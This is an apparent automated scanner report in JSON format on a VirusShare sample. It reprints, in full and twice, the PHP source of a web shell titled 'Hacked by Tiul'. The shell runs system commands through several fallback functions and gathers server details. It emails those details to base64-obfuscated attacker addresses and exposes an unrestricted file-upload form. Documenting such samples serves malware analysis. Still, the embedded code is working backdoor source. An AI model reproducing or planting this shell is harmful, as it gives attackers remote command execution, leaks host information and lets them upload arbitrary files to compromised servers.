{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "popen": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<html>\n<head>\n<title>Hacked by Tiul</title>\n\n<?php\n\n$sh_id = \"VGl1bA==\";\n$sh_ver = \"- exploit\";\n$sh_name = base64_decode($sh_id).$sh_ver;\necho $sh_name;#este es un ID\n\n/////////////////////////////////////////////////\n##[ Fx29ID ]##\nfx(\"ID\",\"kun\".\"kun\"); #este es otro ID\n$P   = @getcwd();\n$IP  = @getenv(\"SERVER_ADDR\");\n$UID = fx29exec(\"id\");\nfx(\"SAFE MODE\",@safemode()?\"ON\":\"OFF\");\nfx(\"OS\",@PHP_OS);\nfx(\"UNAME\",@php_uname());\nfx(\"SERVER\",($IP)?$IP:\"-\");\nfx(\"USER\",@get_current_user());\nfx(\"UID\",($UID)?$UID:\"uid=\".@getmyuid().\" gid=\".@getmygid());\nfx(\"DIR\",$P);\nfx(\"PERM\",(@is_writable($P))?\"[W]\":\"[R]\");\nfx(\"HDD\",\"Used: \".hdd(\"used\").\" Free: \".hdd(\"free\").\" Total: \".hdd(\"total\"));\nfx(\"DISFUNC\",@getdisfunc());\n##[ FX29SHEXEC ]##\nfunction fx($t,$c) { echo \"$t: \"; echo (is_array($c))?join(\" \",$c):$c; echo \"<br>\"; }\nfunction safemode() { return (@ini_get(\"safe_mode\") OR eregi(\"on\",@ini_get(\"safe_mode\")) ) ? TRUE : FALSE; }\nfunction getdisfunc() { $rez = explode(\",\",@ini_get(\"disable_functions\")); return (!empty($rez))?$rez:array(); }\nfunction enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }\nfunction fx29exec($cmd) {\n  if (enabled(\"exec\")) { exec($cmd,$o); $rez = join(\"\\r\\n\",$o); }\n  elseif (enabled(\"shell_exec\")) { $rez = shell_exec($cmd); }\n  elseif (enabled(\"system\")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  \n  elseif (enabled(\"passthru\")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }\n  elseif (enabled(\"popen\") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }\n  else { $rez = \"Error!\"; }\n  return $rez;\n}\nfunction vsize($size) {\n  if (!is_numeric($size)) { return FALSE; }\n  else {\n    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 .\" GB\"; }\n    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 .\" MB\"; }\n    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 .\" KB\"; }\n    else { $size = $size . \" B\"; }\n    return $size;\n  }\n}\nfunction hdd($type) {\n  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;\n  $hddspace = array(\"total\" => vsize($T), \"free\"  => vsize($F), \"used\"  => vsize($U));\n  return $hddspace[$type];\n}\n\n///////////////////////////////////////////////////\n\n\n\n\n$creator = base64_decode(\"dGl1bGhhY2tAeWFob28uY29t\");\n$creator2 = base64_decode(\"cm91dGVyQHk3bWFpbC5jb20=\");\n($safe_mode)?($safemode=\"ON\"):($safemode=\"OFF\");\n$base=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n$name = php_uname();\n$ip = getenv(\"REMOTE_ADDR\");\n$host = gethostbyaddr($_SERVER[REMOTE_ADDR]);\n$subj = $_SERVER['HTTP_HOST'];\n$msg = \" BASE: $base uname -a: $name IP: $ip Host: $host $pwds \";\n$from =\"From: MODE_=\".$safemode.\"\";\nmail( $creator, $subj, $msg, $from);\nmail( $creator2, $subj, $msg, $from);\nmail( $creator2, \"subj123\", $msg, \"From: Algo<$creator2>\\r\\nContent-type: text/html\\r\\n\");\n\n\n?>\n\n\n\n<form enctype=\"multipart/form-data\" method=\"post\">\n<input type=\"file\" name=\"file\" size=\"20\">\n<input type=\"submit\" value=\"!\"> \n</p>\n</form>\n<?php \nfunction check_file() \n{ \nglobal $file_name, $filename; \n    $backupstring = \"copy_of_\"; \n    $filename = $backupstring.\"$filename\"; \n    if( file_exists($filename)) \n    { check_file(); } \n} \nif(!empty($file)) \n{ $filename = $file_name; copy($file,\"$filename\"); } \nexit;\n?> \n\n\n</html>"
    },
    "filename": "VirusShare_2fc9b3e1bb4b8ead4b67583b004c89a6",
    "filesize": 3439,
    "filetype": "HTML document, ASCII text",
    "hashes": {
        "md5": "2fc9b3e1bb4b8ead4b67583b004c89a6",
        "sha1": "9d31aaaa29b689f8a02d580ef7647be850239edd",
        "sha256": "b4f7b2d3106cabdd2b613f23a54b13d9cacd2a7b82d8276a62c7f8d5e988b089"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<html>",
            "<head>",
            "<title>Hacked by Tiul</title>",
            "<?php",
            "$sh_id = \"VGl1bA==\";",
            "$sh_ver = \"- exploit\";",
            "$sh_name = base64_decode($sh_id).$sh_ver;",
            "echo $sh_name;#este es un ID",
            "/////////////////////////////////////////////////",
            "##[ Fx29ID ]##",
            "fx(\"ID\",\"kun\".\"kun\"); #este es otro ID",
            "$P   = @getcwd();",
            "$IP  = @getenv(\"SERVER_ADDR\");",
            "$UID = fx29exec(\"id\");",
            "fx(\"SAFE MODE\",@safemode()?\"ON\":\"OFF\");",
            "fx(\"OS\",@PHP_OS);",
            "fx(\"UNAME\",@php_uname());",
            "fx(\"SERVER\",($IP)?$IP:\"-\");",
            "fx(\"USER\",@get_current_user());",
            "fx(\"UID\",($UID)?$UID:\"uid=\".@getmyuid().\" gid=\".@getmygid());",
            "fx(\"DIR\",$P);",
            "fx(\"PERM\",(@is_writable($P))?\"[W]\":\"[R]\");",
            "fx(\"HDD\",\"Used: \".hdd(\"used\").\" Free: \".hdd(\"free\").\" Total: \".hdd(\"total\"));",
            "fx(\"DISFUNC\",@getdisfunc());",
            "##[ FX29SHEXEC ]##",
            "function fx($t,$c) { echo \"$t: \"; echo (is_array($c))?join(\" \",$c):$c; echo \"<br>\"; }",
            "function safemode() { return (@ini_get(\"safe_mode\") OR eregi(\"on\",@ini_get(\"safe_mode\")) ) ? TRUE : FALSE; }",
            "function getdisfunc() { $rez = explode(\",\",@ini_get(\"disable_functions\")); return (!empty($rez))?$rez:array(); }",
            "function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }",
            "function fx29exec($cmd) {",
            "  if (enabled(\"exec\")) { exec($cmd,$o); $rez = join(\"\\r\\n\",$o); }",
            "  elseif (enabled(\"shell_exec\")) { $rez = shell_exec($cmd); }",
            "  elseif (enabled(\"system\")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  ",
            "  elseif (enabled(\"passthru\")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }",
            "  elseif (enabled(\"popen\") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }",
            "  else { $rez = \"Error!\"; }",
            "  return $rez;",
            "function vsize($size) {",
            "  if (!is_numeric($size)) { return FALSE; }",
            "  else {",
            "    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 .\" GB\"; }",
            "    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 .\" MB\"; }",
            "    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 .\" KB\"; }",
            "    else { $size = $size . \" B\"; }",
            "    return $size;",
            "function hdd($type) {",
            "  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;",
            "  $hddspace = array(\"total\" => vsize($T), \"free\"  => vsize($F), \"used\"  => vsize($U));",
            "  return $hddspace[$type];",
            "///////////////////////////////////////////////////",
            "$creator = base64_decode(\"dGl1bGhhY2tAeWFob28uY29t\");",
            "$creator2 = base64_decode(\"cm91dGVyQHk3bWFpbC5jb20=\");",
            "($safe_mode)?($safemode=\"ON\"):($safemode=\"OFF\");",
            "$base=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];",
            "$name = php_uname();",
            "$ip = getenv(\"REMOTE_ADDR\");",
            "$host = gethostbyaddr($_SERVER[REMOTE_ADDR]);",
            "$subj = $_SERVER['HTTP_HOST'];",
            "$msg = \" BASE: $base uname -a: $name IP: $ip Host: $host $pwds \";",
            "$from =\"From: MODE_=\".$safemode.\"\";",
            "mail( $creator, $subj, $msg, $from);",
            "mail( $creator2, $subj, $msg, $from);",
            "mail( $creator2, \"subj123\", $msg, \"From: Algo<$creator2>\\r\\nContent-type: text/html\\r\\n\");",
            "<form enctype=\"multipart/form-data\" method=\"post\">",
            "<input type=\"file\" name=\"file\" size=\"20\">",
            "<input type=\"submit\" value=\"!\"> ",
            "</p>",
            "</form>",
            "<?php ",
            "function check_file() ",
            "global $file_name, $filename; ",
            "    $backupstring = \"copy_of_\"; ",
            "    $filename = $backupstring.\"$filename\"; ",
            "    if( file_exists($filename)) ",
            "    { check_file(); } ",
            "if(!empty($file)) ",
            "{ $filename = $file_name; copy($file,\"$filename\"); } ",
            "exit;",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://"
        ]
    },
    "time": "0:00:00.275980",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
